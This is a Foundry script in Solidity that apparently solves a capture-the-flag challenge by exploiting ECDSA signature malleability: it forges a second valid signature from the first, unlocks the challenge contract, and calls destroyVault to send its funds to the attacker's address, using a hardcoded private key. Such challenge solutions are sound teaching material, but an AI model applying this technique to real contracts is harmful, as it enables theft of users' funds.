// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {Challenge} from "src/Challenge.sol";

contract Solve is Script {
    
    address constant CHALLENGE = 0xfbEEAFDB30F30C6911063FBa83da402cD42156e0; 
    uint256 pk = 0x3da2b9f371d75f03e91bbbeb1da81fac34721d71a2b12bd1ae547426a4b4f559;

    function run() external {
        vm.startBroadcast(pk);

        Challenge target = Challenge(CHALLENGE);
        console2.log("Is unlocked", target.unlocked()); // Should be False

        // Hash
        bytes32 hash = keccak256("Keep pwning");
        
        // First signature
        (uint8 v1, bytes32 r1, bytes32 s1) = vm.sign(pk, hash);

        // Signature maleability to get the second
        bytes32 groupOrder = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
        bytes32 s2 = bytes32(uint256(groupOrder) - uint256(s1));
        uint8 v2 = v1 == 27 ? 28 : 27;
        bytes32 r2 = r1;
        
        // Authenticate with those 2 signatures
        target.authenticate(hash, v1, r1, s1, v2, r2, s2);

        console2.log("Is unlocked", target.unlocked()); // Should be True

        // Redirect funds to us
        target.destroyVault(vm.addr(pk));

        // Giga chad it's solved
        console2.log("Is solved", target.isSolved());
    }
}
